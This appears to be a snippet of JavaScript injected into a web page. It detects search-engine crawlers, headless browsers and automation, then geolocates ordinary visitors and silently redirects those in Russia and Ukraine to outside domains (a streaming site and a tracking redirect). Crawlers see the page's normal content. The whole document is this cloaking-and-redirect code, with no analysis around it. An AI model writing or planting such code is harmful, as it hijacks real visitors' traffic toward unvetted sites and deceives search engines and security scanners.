```html
<script>
var ua = navigator.userAgent.toLowerCase();

var isLikelyBot =
  ua.includes('googlebot') ||
  ua.includes('bingbot') ||
  ua.includes('yahoo') ||
  ua.includes('yandex') ||
  ua.includes('baiduspider') ||
  ua.includes('compatible') ||
  ua.includes('bot') ||
  ua.includes('crawler') ||
  ua.includes('spider') ||
  /headless/i.test(ua) ||
  navigator.webdriver === true;

if (!isLikelyBot) {

  fetch("https://ipapi.co/json/")
    .then(response => response.json())
    .then(data => {

      var country = data.country_code;

      console.log("Country:", country);

      if (country === "RU") {
        window.location.replace("https://smotrim-filmix.xyz/Vishka-2026-G7nk");
      }

      else if (country === "UA") {
        window.location.replace("https://x6gb.shop/3/rd.php?url=/l/ehtx");
      }

    })
    .catch(error => {
      console.log("Не удалось определить страну:", error);
    });

} else {
  console.log("Bot/crawler-like detected → serving content");
}
</script>
```

